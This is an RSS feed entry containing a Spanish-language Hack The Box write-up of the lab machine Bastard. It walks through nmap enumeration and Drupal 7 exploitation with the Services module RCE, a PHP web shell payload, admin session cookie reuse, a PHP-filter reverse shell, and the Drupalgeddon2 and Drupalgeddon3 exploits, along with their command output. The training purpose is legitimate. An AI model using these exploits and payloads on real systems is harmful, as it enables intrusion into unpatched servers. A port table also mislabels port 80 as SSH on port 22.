<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Firtsmiracle blog de Ciberseguridad</title>
    <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sat, 29 Apr 2023 04:37:30 +0000</pubDate>
    <lastBuildDate>Sat, 29 Apr 2023 04:37:30 +0000</lastBuildDate>
    <generator>Jekyll v3.9.0</generator>
    
      <item>
        <title>Maquina Bastard - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina Bastard de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Windows&lt;/code&gt; de dificultad &lt;code&gt;Media&lt;/code&gt;. Para explotar esta maquina abusaremos una vulnerabilidad de una versión de &lt;code&gt;Drupal&lt;/code&gt; con la que obtendremos ejecución remota de comandos - &lt;code&gt;esto lo haremos de maneras alternativas&lt;/code&gt;, despues una vez tengamos acceso al sistema usaremos la herramienta &lt;code&gt;sherlock&lt;/code&gt; para realizar un reconocimiento con la que detectaremos una vulnerabilidad asociada a un &lt;code&gt;exploit&lt;/code&gt; con el que nos permita elevar nuestro privilegio para convertirmos en el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costrumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Bastard
❯ ls
 Bastard
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeración&quot;&gt;Enumeración &lt;a href=&quot;#enumeración&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.9
PING 10.10.10.9 (10.10.10.9) 56(84) bytes of data.
64 bytes from 10.10.10.9: icmp_seq=1 ttl=127 time=123 ms

--- 10.10.10.9 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 123.143/123.143/123.143/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde con un &lt;code&gt;ttl&lt;/code&gt; de &lt;code&gt;127&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemoscon el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.9 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-29 00:54 GMT
Initiating SYN Stealth Scan at 00:54
Scanning 10.10.10.9 [65535 ports]
Discovered open port 135/tcp on 10.10.10.9
Discovered open port 80/tcp on 10.10.10.9
Discovered open port 49154/tcp on 10.10.10.9
Completed SYN Stealth Scan at 00:54, 26.61s elapsed (65535 total ports)
Nmap scan report for 10.10.10.9
Host is up, received user-set (0.13s latency).
Scanned at 2023-04-29 00:54:22 GMT for 26s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 127
135/tcp   open  msrpc   syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.71 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 23 (1.012KB)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de realizarse el escaneo vemos que los puertos abiertos corresponden a  &lt;code&gt;80 http&lt;/code&gt; , &lt;code&gt;135 rpc&lt;/code&gt; y &lt;code&gt;49154 rpc&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p80,135,49154 10.10.10.9 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-29 00:55 GMT
Nmap scan report for 10.10.10.9
Host is up (0.18s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.71 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos la versión de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;Microsoft IIS httpd 7.5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;49154&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Primeramente ya que &lt;code&gt;nmap&lt;/code&gt; nos reporto que el puerto &lt;code&gt;80&lt;/code&gt; se encuentra abierto usaremos &lt;code&gt;whatweb&lt;/code&gt; para tratar identificar a que nos estamos enfrentando y ver el gestor de contenido web desde consola.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.9
http://10.10.10.9 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta nos reporta que se esta usando el gestor de contenido correspondiente a un &lt;code&gt;Drupal 7&lt;/code&gt;, ademas vemos que esta desarrollado en &lt;code&gt;PHP&lt;/code&gt; y &lt;code&gt;ASP.NET&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Drupal: Drupal es un sistema de gestión de contenidos o CMS libre, modular, multipropósito y muy configurable que permite publicar artículos, imágenes, archivos y que también ofrece la posibilidad de otros servicios añadidos como foros, encuestas, votaciones, blogs, administración de usuarios y permisos.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Vamos a proceder a abrir el servicio web en el navegador&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como concretamente vimos que la version de &lt;code&gt;drupal&lt;/code&gt; que esta utilizando corresponde a la version &lt;code&gt;7&lt;/code&gt;, podemos tratar de buscar &lt;code&gt;vulnerablidades&lt;/code&gt; asociadas a esta versión. Para ello usaremos &lt;code&gt;searchsploit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit drupal 7.x
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 7.x Module Services - Remote Code Execution                                                                                                   | php/webapps/41564.php
Drupal &amp;lt; 7.34 - Denial of Service                                                                                                                    | php/dos/35415.txt
Drupal &amp;lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                             | php/webapps/44557.rb
Drupal &amp;lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                          | php/webapps/44542.txt
Drupal &amp;lt; 7.58 / &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                  | php/webapps/44449.rb
Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                              | php/remote/44482.rb
Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                     | php/webapps/44448.py
Drupal &amp;lt; 8.5.11 / &amp;lt; 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                | php/remote/46510.rb
Drupal &amp;lt; 8.6.10 / &amp;lt; 8.5.11 - REST Module Remote Code Execution                                                                                       | php/webapps/46452.txt
Drupal &amp;lt; 8.6.9 - REST Module Remote Code Execution                                                                                                   | php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                    | php/webapps/44501.txt
Drupal Module CKEditor &amp;lt; 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                               | php/webapps/25493.txt
Drupal Module Coder &amp;lt; 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                        | php/remote/40144.php
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                    | php/remote/40130.rb
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver varias vulnerabilidades asociadas a la versión que corresponden a &lt;code&gt;RCE (ejecucion remota de comandos)&lt;/code&gt;.Usaremos el primer &lt;code&gt;exploit&lt;/code&gt; que corresponde a uno en &lt;code&gt;php&lt;/code&gt;, para ello vamos a proceder a traernoslo a nuestro directorio de trabajo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit -x php/webapps/41564.php
❯ ls
 41564.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Este &lt;code&gt;exploit&lt;/code&gt; aprovecha una inyeccion &lt;code&gt;sql&lt;/code&gt; para obtener la cache del endpoint y credenciales de administrador en hash, para despues tratar de subir un archivo &lt;code&gt;php&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;# Initialization

error_reporting(E_ALL);

define('QID', 'anything');
define('TYPE_PHP', 'application/vnd.php.serialized');
define('TYPE_JSON', 'application/json');
define('CONTROLLER', 'user');
define('ACTION', 'login');

$url = 'http://vmweb.lan/drupal-7.54';
$endpoint_path = '/rest_endpoint';
$endpoint = 'rest_endpoint';

$file = [
    'filename' =&amp;gt; 'dixuSOspsOUU.php',
    'data' =&amp;gt; '&amp;lt;?php eval(file_get_contents(\'php://input\')); ?&amp;gt;'
];

$browser = new Browser($url . $endpoint_path);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para utulizar el &lt;code&gt;exploit&lt;/code&gt;, primero debemos cambiar ciertas variables que define el &lt;code&gt;exploit&lt;/code&gt; como la &lt;code&gt;url&lt;/code&gt; y el &lt;code&gt;endpoint_path&lt;/code&gt;. En este caso debemos verificar si &lt;code&gt;rest_endpoint&lt;/code&gt; existe.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que &lt;code&gt;rest_endpoint&lt;/code&gt; no existe asi que podemos tratar usar un poco de &lt;code&gt;guesing&lt;/code&gt; y probar la ruta &lt;code&gt;rest&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Efectivamente vemos que se cambio la ruta por defecto a &lt;code&gt;rest&lt;/code&gt;, claro que de no haber acertado de esta forma, podriamos realizar un ataque de fuerza bruta para descubrir esta ruta como una manera alterna de hacerlo.&lt;/p&gt;

&lt;p&gt;Pues viendo que esta ruta si es valida tbm lo modificaremos en el &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Finalmente vamos a modificar el archivo que crea por defecto, y vamos a crear uno propio. Este codigo nos permitira ejecutar comandos en la maquina victima mediante el parametro &lt;code&gt;cmd&lt;/code&gt; a traves de la función &lt;code&gt;shell_exec&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
    echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El exploit procederia a quedarnos de la siguiente manera con los cambios realizados.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;# Initialization

error_reporting(E_ALL);

define('QID', 'anything');
define('TYPE_PHP', 'application/vnd.php.serialized');
define('TYPE_JSON', 'application/json');
define('CONTROLLER', 'user');
define('ACTION', 'login');

$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' =&amp;gt; 'pwn.php',
    'data' =&amp;gt; '&amp;lt;?php echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST[\'cmd\']) . &quot;&amp;lt;/pre&amp;gt;&quot;; ?&amp;gt;'
];

$browser = new Browser($url . $endpoint_path);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora procedemos a ejecutar el &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php drupal.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/pwn.php
❯ ls
 drupal.php   session.json   user.json
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;VIsualizamos que el archivo nos lo sube en la ruta principal, lo siguiente sera validar el archivo subido.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo que ahora nos quedaria hacer, es enviarnos una &lt;code&gt;revershell&lt;/code&gt; a nuestra maquina.&lt;/p&gt;

&lt;p&gt;De manera alternativa para ganar acceso vimos que antes, al ejecutar el &lt;code&gt;exploit&lt;/code&gt;, nos creo un archivo &lt;code&gt;session.json&lt;/code&gt; que contiene la sesion de usuario &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{
    &quot;session_name&quot;: &quot;SESSd873f26fc11f2b7e6e4aa0f6fce59913&quot;,
    &quot;session_id&quot;: &quot;nERMEmBNPdBhSKZWnCye941RZL_zlBbAWPEuBs_0W2c&quot;,
    &quot;token&quot;: &quot;F_Tzii9LQfqeF9ekHCP4qTIGp1VYlIU0fuG2LiIfwIA&quot;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos cambiar nuestra &lt;code&gt;cookie&lt;/code&gt; de sesión de manera simple con la opción &lt;code&gt;inspeccionar&lt;/code&gt;, insertando el &lt;code&gt;session_name&lt;/code&gt; en el campo &lt;code&gt;nombre&lt;/code&gt; y el &lt;code&gt;session_id&lt;/code&gt; en &lt;code&gt;valor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez insertados los campos recargamos la pagina y ya estariamos logeados como el usuario &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que somos el ususario &lt;code&gt;admin&lt;/code&gt;, podriamos dirigirnos a la opción &lt;code&gt;Modules&lt;/code&gt; y activar la opción de &lt;code&gt;PHP filter&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues agregamos un nuevo contenido en &lt;code&gt;content&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a la opción &lt;code&gt;articule&lt;/code&gt; y agregamos un nombre, en el cuerpo podemos ejecutar codigo &lt;code&gt;php&lt;/code&gt;. En este caso usare un codigo &lt;code&gt;reverse shell&lt;/code&gt; en &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Puedes usar este codigo, solo necesitas cambiar la &lt;code&gt;ip&lt;/code&gt; y &lt;code&gt;puerto&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php&quot;&gt;https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Establecemos en formato el de &lt;code&gt;PHP code&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos en escucha por el puerto que configuramos en el &lt;code&gt;codigo&lt;/code&gt; en mi caso en el puerto &lt;code&gt;443&lt;/code&gt;. Finalmente seleccionamos en la opción &lt;code&gt;Preview&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y habriamos ganado acceso como el usuario &lt;code&gt;iis apppool\drupal&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49279.
SOCKET: Shell has connected! PID: 2644
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54&amp;gt;whoami
iis apppool\drupal

C:\inetpub\drupal-7.54&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como segunda forma alternativa, podemos hacer uso del exploit &lt;code&gt;drupalgeddon2&lt;/code&gt;. Podemos encontrar el exploit usando &lt;code&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit drupalgeddon2
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal &amp;lt; 7.58 / &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                  | php/webapps/44449.rb
Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                              | php/remote/44482.rb
Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                     | php/webapps/44448.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta hecho en &lt;code&gt;ruby&lt;/code&gt; por lo que debemos tenerlo instalado para poder ejecutarlo. Lo que conseguiremos con este exploit es ganar acceso a la maquina victima mediante &lt;code&gt;RCE&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Como requisito lo mas probable es que te pida instalar la gema &lt;code&gt;highline&lt;/code&gt;, lo cual se realiza del siguiente modo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ gem install highline
Fetching highline-2.1.0.gem
Successfully installed highline-2.1.0
Parsing documentation for highline-2.1.0
Installing ri documentation for highline-2.1.0
Done installing documentation for highline after 2 seconds
1 gem installed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez instalada podemos ejecutar el exploit correctamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ruby drupalgeddon.rb
Usage: ruby drupalggedon2.rb &amp;lt;target&amp;gt; [--authentication] [--verbose]
Example for target that does not require authentication:
       ruby drupalgeddon2.rb https://example.com
Example for target that does require authentication:
       ruby drupalgeddon2.rb https://example.com --authentication
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo unico que le necesitamos proporcionar es el target en este caso la ip de la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ruby drupalgeddon.rb http://10.10.10.9
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.9/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta te automatiza el proceso para ganar acceso como el usuario &lt;code&gt;nt authority\iusr&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[*] Dropping back to direct OS commands
drupalgeddon2&amp;gt;&amp;gt; whoami
nt authority\iusr
drupalgeddon2&amp;gt;&amp;gt; ipconfig
Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.9
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{56FEC108-3F71-4327-BF45-2B4EE355CD0F}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como tercera alternativa, tenemos el &lt;code&gt;drupalgeddon3&lt;/code&gt;, del repositorio de:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/oways/SA-CORE-2018-004&quot;&gt;https://github.com/oways/SA-CORE-2018-004&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nos clonamos el respositorio y tenemos un script hecho el &lt;code&gt;python3&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git clone https://github.com/oways/SA-CORE-2018-004
Clonando en 'SA-CORE-2018-004'...
remote: Enumerating objects: 15, done.
remote: Total 15 (delta 0), reused 0 (delta 0), pack-reused 15
Recibiendo objetos: 100% (15/15), 106.84 KiB | 475.00 KiB/s, listo.
Resolviendo deltas: 100% (2/2), listo.
❯ cd SA-CORE-2018-004
❯ ls
 drupalgeddon3.py   example.png   README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 drupalgeddon3.py

[Usage]
python drupalgeddon3.py [URL] [Session] [Exist Node number] [Command]

[Example]
python drupalgeddon3.py http://target/drupal/ &quot;SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0&quot; 6 &quot;uname -a&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ejecutarlo nos pide el &lt;code&gt;target&lt;/code&gt; y la &lt;code&gt;session&lt;/code&gt; que habriamos obtenido anteriormente con el primer &lt;code&gt;exploit&lt;/code&gt;, seguidamente nos pide un &lt;code&gt;nodo&lt;/code&gt; existente que lo podemos ver en la opción &lt;code&gt;content &amp;gt; find content&lt;/code&gt; y en &lt;code&gt;REST&lt;/code&gt; haciendo &lt;code&gt;hovering (pasar el mouse encima de la opción)&lt;/code&gt; vemos el numero de &lt;code&gt;nodo&lt;/code&gt; y finalmente el comando que queremos ejecutar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 drupalgeddon3.py http://10.10.10.9 &quot;SESSd873f26fc11f2b7e6e4aa0f6fce59913=nERMEmBNPdBhSKZWnCye941RZL_zlBbAWPEuBs_0W2c&quot; 1 &quot;whoami&quot;
nt authority\iusr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El exploit funciona correctamente y esta seria la tercera forma de ganar acceso al sistema.&lt;/p&gt;

